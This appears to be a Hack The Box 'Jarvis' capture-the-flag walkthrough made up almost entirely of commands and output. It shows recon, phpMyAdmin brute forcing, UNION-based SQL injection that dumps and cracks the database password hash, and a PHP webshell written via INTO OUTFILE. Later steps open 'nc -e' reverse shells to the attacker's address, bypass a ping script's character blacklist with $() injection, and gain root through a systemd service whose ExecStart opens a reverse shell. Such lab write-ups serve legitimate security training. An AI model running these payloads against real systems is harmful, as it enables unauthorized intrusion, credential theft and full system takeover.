@@ -1,0 +1,593 @@
+RECON
+root@kali:~/htb/jarvis# nmap -sC -sV -p- -vv -oA  full 10.10.10.143
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X
+|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ=
+|   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo
+80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Stark Hotel
+64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+WEB ENUM 10.10.10.143
+root@kali:~/htb/jarvis# nikto -h 10.10.10.143
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.143
++ Target Hostname:    10.10.10.143
++ Target Port:        80
++ Start Time:         2020-12-04 21:09:55 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.25 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'ironwaf' found, with contents: 2.0.3
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie PHPSESSID created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ Uncommon header 'x-robots-tag' found, with contents: noindex, nofollow
++ Uncommon header 'x-permitted-cross-domain-policies' found, with contents: none
++ Uncommon header 'referrer-policy' found, with contents: no-referrer
++ Uncommon header 'x-ob_mode' found, with contents: 1
++ Server leaks inodes via ETags, header found with file /phpmyadmin/ChangeLog, fields: 0x4af2 0x569435d9f4e80 
++ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 7499 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2020-12-04 21:14:43 (GMT-5) (288 seconds)
+---------------------------------------------------------------------------
+
+root@kali:~/htb/jarvis# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://10.10.10.143 -x png,txt,db,php,jpg,py,config,html -s 200,204,301,302,307,403 -t 100
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.143/
+[+] Threads      : 100
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 403,200,204,301,302,307
+[+] Extensions   : .png,.txt,.db,.php,.jpg,.py,.config,.html
+=====================================================
+/images (Status: 301)
+/index.php (Status: 200)
+/nav.php (Status: 200)
+/footer.php (Status: 200)
+/css (Status: 301)
+/js (Status: 301)
+/fonts (Status: 301)
+/phpmyadmin (Status: 301)
+/connection.php (Status: 200)
+/room.php (Status: 302)
+/sass (Status: 301)
+/server-status (Status: 403)
+=====================================================
+
+
++ 1 host(s) tested
+
+WEB ENUM SUPERSECUREHOTEL
+root@kali:~/htb/jarvis# nikto -h supersecurehotel.htb
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.43
++ Target Hostname:    supersecurehotel.htb
++ Target Port:        80
++ Start Time:         2020-12-04 21:09:43 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0xb2 0x5535e4e04002a 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ /info.php: Output from the phpinfo() function was found.
++ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /info.php?file=http://cirt.net/rfiinc.txt?: Output from the phpinfo() function was found.
++ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
++ 7445 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2020-12-04 21:14:03 (GMT-5) (260 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@kali:~/htb/bastion# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://supersecurehotel.htb -x png,txt,db,php,jpg,py,config,html -s 200,204,301,302,307,403 -t 100
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://supersecurehotel.htb/
+[+] Threads      : 100
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 403,200,204,301,302,307
+[+] Extensions   : .png,.txt,.db,.php,.jpg,.py,.config,.html
+=====================================================
+/info.php (Status: 200)
+/index.html (Status: 200)
+/department (Status: 301)
+/server-status (Status: 403)
+=====================================================
+
+BRUTE FORCE PHPMYADMIN
+root@kali:~/htb/jarvis# patator http_fuzz url=http://10.10.10.143/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=/usr/share/wordlists/rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
+
+root@kali:~/htb/jarvis# hydra -l root -P /usr/share/wordlists/rockyou.txt -f -e ns -vV 10.10.10.143 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+
+root@kali:~/htb/jarvis# hydra -l admin -P /usr/share/wordlists/rockyou.txt -e ns -vV 10.10.10.143 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+
+CHECK FOR SQLi AT ROOM.PHP PAGE
+http://supersecurehotel.htb/room.php?cod=1
+http://supersecurehotel.htb/room.php?cod='
+
+SQLi WITH SQL MAP
+sqlmap -u "http://10.10.10.143/room.php?cod=1" -p cod --level 4 --risk 3 --dbms=MySQL --os-shell
+
+OR MANUAL SQLi
+SQLi UNION QUERY WORKS
+http://supersecurehotel.htb/room.php?cod=1 UNION SELECT 1-- -
+http://supersecurehotel.htb/room.php?cod=1%20UNION%20SELECT%201--%20-
+
+TEST FOR NUMBER OF DB COLUMNS
+http://supersecurehotel.htb/room.php?cod=1+UNION+SELECT+1,2,3,4,5--+-
+
+http://supersecurehotel.htb/room.php?cod=1+UNION+SELECT+1,2,3,4,5,6,database()--+-
+
+7 COLUMNS FROM RESPONSE
+http://10.10.10.143/room.php?cod=-1%20union%20select%201,2,3,4,5,6,7
+http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7
+
+REPLACE POSITIONS 2,3,4 WITH DB QUERIES
+http://10.10.10.143/room.php?cod=-1%20union%20select%201,version(),database(),user(),5,6,7
+http://10.10.10.143/room.php?cod=-1 union select 1,version(),database(),user(),5,6,7
+
+5
+10.1.37-MariaDB-0+deb9u1
+
+$ hotel / per night
+
+DBadmin@localhost
+
+FURTHER ENUMERATE THE HOTEL DATABASE
+http://10.10.10.143/room.php?cod=-1 union select 1,group_concat(schema_name),3,4,5,6,7 from (select schema_name from information_schema.schemata limit 0,100)a
+http://10.10.10.143/room.php?cod=-1%20union%20select%201,group_concat(schema_name),3,4,5,6,7%20from%20(select%20schema_name%20from%20information_schema.schemata%20limit%200,100)a
+
+hotel,information_schema,mysql,performance_schema
+
+http://10.10.10.143/room.php?cod=-1 union select 1,table_name,3,4,5,6,7 from information_schema.tables
+room
+
+ADJUST THE SQL QUERY TO GET TABLE ROOM SCHEMA SETTINGS
+http://10.10.10.143/room.php?cod=-1%20union%20select%201,group_concat(table_name),3,4,5,6,7%20from%20(select%20table_name%20from%20information_schema.tables%20limit%200,100)a
+http://10.10.10.143/room.php?cod=-1 union select 1,group_concat(table_name),3,4,5,6,7 from (select table_name from information_schema.tables limit 0,100)a
+room,ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_CACHES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,GEOMETRY_COLUMNS,SPATIAL_REF_SYS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,TABLE_STATISTICS,INNODB_SYS_TABLESTATS,USER_STATISTICS,INNODB_SYS_INDEXES,XTRADB_RSEG,INNODB_CMP_PER_INDEX,INNODB_TRX,CHANGED_PAGE_BITMAPS,INNODB_FT_BEING_DELETED,INNODB_LOCK_WAITS,INNODB_LOCKS,INNODB_TABLESPACES_ENCRYPTION,XTRADB_INTERNAL_HASH_TABLES,INNODB_SYS_FIELDS,INNODB_CMPMEM_RESET,INNODB_CMP,INNODB_FT_INDEX_TABLE,INNODB_SYS_TABLESPACES,INNODB_MUTEXES,INNODB_BUFFER_PAGE_LRU,INNODB_SYS_FOREIGN_COLS,INNODB_CMP_RESET,INNODB_BUFFER_POOL_STATS,INNODB_FT
+
+
+GET COLUMN NAMES FROM ROOM TABLE
+http://10.10.10.143/room.php?cod=-1+union+select+1,cast(group_concat(column_name)+as+char(2048)),3,4,5,6,7+from+(select+column_name+from+information_schema.columns+where+table_name=%27room%27+limit+0,2000)a
+cod,name,price,descrip,star,image,mini
+
+GET ROOM TABLE VALUES
+http://10.10.10.143/room.php?cod=-1+union+select+1,cast(group_concat(cod,0x3a,name)+as+char(2048)),3,4,5,6,7+from+room+limit+0,1000--
+OR
+http://10.10.10.143/room.php?cod=-1+union+select+1,cast(group_concat(cod,0x3a,name)+as+char(2048)),3,4,5,6,7+from+room
+1:Superior Family Room,2:Suite,3:Double Room,4:Family Room,5:Classic Double Room,6:Superior Family Room
+
+GET COLUMN NAMES FROM USER TABLE
+http://10.10.10.143/room.php?cod=-1+union+select+1,cast(group_concat(column_name)+as+char(2048)),3,4,5,6,7+from+(select+column_name+from+information_schema.columns+where+table_schema=%27mysql%27+and+table_name=%27user%27+limit+0,2000)a
+Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,Event_priv,Trigger_priv,Create_tablespace_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections,plugin,authentication_string,password_expired,is_role,default_role,max_statement_time
+
+GET DATA FROM USER TABLE
+http://10.10.10.143/room.php?cod=-1+union+select+1,cast(group_concat(User,0x3a,Password)+as+char(2048)),3,4,5,6,7+from+(select+User,Password+from+mysql.user+limit+0,2000)a
+DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+
+CRACK PASSWORD WITH JOHN
+root@kali:~/htb/jarvis# ./john /root/htb/jarvis/jarvis_hash --wordlist==/usr/share/wordlists/rockyou.txt
+imissyou	(DBadmin)
+
+UPLOAD A WEBSHELL
+http://10.10.10.143//room.php?cod=-1+union+select+1,+'<%3fphp+system($_GET["cmd"]);+%3f>',3,4,5,6,7+into+outfile+'/var/www/html/shell.php'
+
+TEST WEBSHELL
+root@kali:~/htb/jarvis# curl -i -s -k -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://10.10.10.143/shell.php?cmd=whoami'
+HTTP/1.1 200 OK
+Date: Sat, 05 Dec 2020 21:24:48 GMT
+Server: Apache/2.4.25 (Debian)
+IronWAF: 2.0.3
+Content-Length: 22
+Content-Type: text/html; charset=UTF-8
+
+1	www-data
+	3	4	5	6	7
+
+
+REQUEST PASSWD FILE
+http://10.10.10.143/shell.php?cmd=cat%20/etc/passwd
+root@kali:~/htb/jarvis# curl -i -s -k -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://10.10.10.143/shell.php?cmd=cat%20/etc/passwd'
+HTTP/1.1 200 OK
+Date: Sat, 05 Dec 2020 21:26:34 GMT
+Server: Apache/2.4.25 (Debian)
+Vary: Accept-Encoding
+IronWAF: 2.0.3
+Content-Length: 1447
+Content-Type: text/html; charset=UTF-8
+
+1	root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
+mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+	3	4	5	6	7
+
+CREATE REVERSE SHELL
+http://10.10.10.143/shell.php?cmd=echo+%27nc+-e+/bin/sh+10.10.14.8+1234%27+%3E+co.sh
+curl -i -s -k -X $'GET' -H $'Host: 10.10.10.143' -H $'User-Agent: Mozilla/5.0' $'http://10.10.10.143/shell.php?cmd=echo+'nc+-e+/bin/sh+10.10.14.8+1234'+>+co.sh
+
+VERIFY WEBSHELL
+http://10.10.10.143/shell.php?cmd=cat+co.sh
+1 nc -e /bin/sh 10.10.14.8 1234 3 4 5 6 7 
+
+MAKE REVERSE SHELL EXECUTABLE
+http://10.10.10.143/shell.php?cmd=chmod+%2bx+co.sh
+
+CHECK PERMISSIONS ON REVERSE SHELL
+http://10.10.10.143/shell.php?cmd=ls+-l+co.sh
+1 -rwxr-xr-x 1 www-data www-data 30 Dec 5 16:34 co.sh 3 4 5 6 7 
+
+TRIGGER REVERSE SHELL
+http://10.10.10.143/shell.php?cmd=./co.sh
+1 -rwxr-xr-x 1 www-data www-data 30 Dec 5 16:34 co.sh 3 4 5 6 7 
+
+GET REVERSE SHELL
+root@kali:~/htb/bastion# nc -lvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.8] from supersecurehotel.htb [10.10.10.143] 38914
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+hostname
+jarvis
+
+CHECK SUDO PRIVILEGES
+sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+
+REVIEW SIMPLER SCRIPT
+cat /var/www/Admin-Utilities/simpler.py
+#!/usr/bin/env python3
+from datetime import datetime
+import sys
+import os
+from os import listdir
+import re
+
+def show_help():
+    message='''
+********************************************************
+* Simpler   -   A simple simplifier ;)                 *
+* Version 1.0                                          *
+********************************************************
+Usage:  python3 simpler.py [options]
+
+Options:
+    -h/--help   : This help
+    -s          : Statistics
+    -l          : List the attackers IP
+    -p          : ping an attacker IP
+    '''
+    print(message)
+
+def show_header():
+    print('''***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+''')
+
+def show_statistics():
+    path = '/home/pepper/Web/Logs/'
+    print('Statistics\n-----------')
+    listed_files = listdir(path)
+    count = len(listed_files)
+    print('Number of Attackers: ' + str(count))
+    level_1 = 0
+    dat = datetime(1, 1, 1)
+    ip_list = []
+    reks = []
+    ip = ''
+    req = ''
+    rek = ''
+    for i in listed_files:
+        f = open(path + i, 'r')
+        lines = f.readlines()
+        level2, rek = get_max_level(lines)
+        fecha, requ = date_to_num(lines)
+        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if fecha > dat:
+            dat = fecha
+            req = requ
+            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if int(level2) > int(level_1):
+            level_1 = level2
+            ip_list = [ip]
+            reks=[rek]
+        elif int(level2) == int(level_1):
+            ip_list.append(ip)
+            reks.append(rek)
+        f.close()
+	
+    print('Most Risky:')
+    if len(ip_list) > 1:
+        print('More than 1 ip found')
+    cont = 0
+    for i in ip_list:
+        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
+        cont = cont + 1
+	
+    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
+	
+def list_ip():
+    print('Attackers\n-----------')
+    path = '/home/pepper/Web/Logs/'
+    listed_files = listdir(path)
+    for i in listed_files:
+        f = open(path + i,'r')
+        lines = f.readlines()
+        level,req = get_max_level(lines)
+        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
+        f.close()
+
+def date_to_num(lines):
+    dat = datetime(1,1,1)
+    ip = ''
+    req=''
+    for i in lines:
+        if 'Level' in i:
+            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
+            regex = '(\d+)-(.*)-(\d+)(.*)'
+            logEx=re.match(regex, fecha).groups()
+            mes = to_dict(logEx[1])
+            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
+            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
+            if fecha > dat:
+                dat = fecha
+                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
+    return dat, req
+			
+def to_dict(name):
+    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
+    return month_dict[name]
+	
+def get_max_level(lines):
+    level=0
+    for j in lines:
+        if 'Level' in j:
+            if int(j.split(' ')[4]) > int(level):
+                level = j.split(' ')[4]
+                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
+    return level, req
+	
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+
+if __name__ == '__main__':
+    show_header()
+    if len(sys.argv) != 2:
+        show_help()
+        exit()
+    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+        show_help()
+        exit()
+    elif sys.argv[1] == '-s':
+        show_statistics()
+        exit()
+    elif sys.argv[1] == '-l':
+        list_ip()
+        exit()
+    elif sys.argv[1] == '-p':
+        exec_ping()
+        exit()
+    else:
+        show_help()
+        exit()
+
+THE PING COMMAND IN THE SCRIPT HAS A LIST OF FORBIDDEN CHARACTERS SO USE $
+def exec_ping():
+     forbidden = ['&', ';', '-', '`', '||', '|']
+     command = input('Enter an IP: ')
+     for i in forbidden:
+         if i in command:
+             print('Got you')
+             exit()
+     os.system('ping ' + command)
+
+NEED TO CREATE ANOTHER REVERSE SHELL TO GET AS USER PEPPER
+echo "nc -e /bin/bash 10.10.14.8 4321" > /tmp/sh.sh
+
+RUN SIMPLER SCRIPT AS USER PEPPER
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: "$(/bin/bash /tmp/sh.sh)"
+
+GET REVERSE SHELL AS PEPPER
+root@kali:~/htb/jarvis# nc -lvp 4321
+listening on [any] 4321 ...
+connect to [10.10.14.8] from supersecurehotel.htb [10.10.10.143] 56858
+ls -la `which systemctl`
+-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
+id
+uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
+pwd
+/var/www/html
+
+GET USER FLAG
+cat /home/pepper/user.txt
+######################################
+
+REVIEW SETUID CHECK
+find / -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/systemctl
+/bin/umount
+/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+UPGRADE SHELL
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+PRIVESC
+
+pepper@jarvis:/var/www/html$ ls
+
+ayax            css             getfileayax.php  nav.php      rooms-suites.php
+b4nn3d          dining-bar.php  images           phpmyadmin   sass
+co.sh           fonts           index.php        room.php     shell.php
+connection.php  footer.php      js               roomobj.php
+
+pepper@jarvis:/var/www/html$ ls -la /bin/systemctl
+
+-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
+
+REVIEW GTFOBINS FOR SYSTEMCTL
+https://gtfobins.github.io/gtfobins/systemctl/
+
+pepper@jarvis:/var/www/html$ llss
+
+ayax            css             getfileayax.php  nav.php      rooms-suites.php
+b4nn3d          dining-bar.php  images           phpmyadmin   sass
+co.sh           fonts           index.php        room.php     shell.php
+connection.php  footer.php      js               roomobj.php
+
+pepper@jarvis:/var/www/html$ ls -la /bin/systemctl
+
+-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
+pepper@jarvis:/var/www/html$ cd /home/pepper
+
+CREATE TEST.SERVICE FILE
+root@kali:~/htb/jarvis# vim test.service 
+root@kali:~/htb/jarvis# cat test.service 
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "nc -e /bin/sh 10.10.14.8 4444"
+[Install]
+WantedBy=multi-user.target
+
+UPLOAD TEST.SERVICE FILE TO JARVIS
+pepper@jarvis:~$ wget 10.10.14.8/test.service
+
+pepper@jarvis:~$ ls  -l
+
+total 12
+drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
+-rw-r--r-- 1 pepper pepper  113 Dec  5 17:33 test.service
+-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
+
+MAKE IT TEST.SERVICE EXECUTABLE
+pepper@jarvis:~$ chmod +x test.service
+
+SYMLINK THE TEST SERVICE FILE TO SYSTEMCTL
+pepper@jarvis:~$ /bin/systemctl link /home/pepper/test.service
+
+Created symlink /etc/systemd/system/test.service -> /home/pepper/test.service.
+
+ENABLE THE SYMLINK
+pepper@jarvis:~$ /bin/systemctl enable --now /home/pepper/test.service
+
+Created symlink /etc/systemd/system/multi-user.target.wants/test.service -> /home/pepper/test.service.
+
+
+GET ROOT SHELL
+root@kali:~/htb/jarvis# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.8] from supersecurehotel.htb [10.10.10.143] 51464
+id
+uid=0(root) gid=0(root) groups=0(root)
+hostname
+jarvis
+
+GET ROOT FLAG
+cat /root/root.txt
+##################################
+
+
+
+
+
